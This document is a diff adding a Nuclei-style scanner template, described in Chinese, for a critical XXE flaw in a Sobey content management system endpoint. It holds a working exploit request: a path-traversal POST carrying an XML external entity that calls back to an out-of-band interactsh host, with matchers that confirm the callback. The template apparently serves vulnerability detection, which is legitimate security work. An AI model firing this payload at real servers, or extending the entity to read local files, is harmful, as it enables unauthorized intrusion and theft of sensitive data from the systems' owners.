@@ -1,0 +1,42 @@
+id: sobeylingyun-AITaskBack-xxe
+info:
+  name: 索贝内容管理系统 /sobey-mchEditor/mch/AIInt/AITaskBack XML外部实体注入(XXE)漏洞
+  author: leadlife
+  severity: critical
+  description: 索贝 /sobey-mchEditor/mch/AIInt/AITaskBack 接口存在XML外部实体注入（XXE）漏洞。攻击者可以通过构造恶意的XML数据包，利用该漏洞读取服务器上的敏感文件或发起其他恶意操作，可能导致敏感信息泄露。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ghwcr0khnxs2io5r
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: oob,xxe,sobeylingyun
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Content-Length: 161
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
+        ]>
+        <root>
+          <TextResult>&xxe;</TextResult>
+        </root>
+      
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
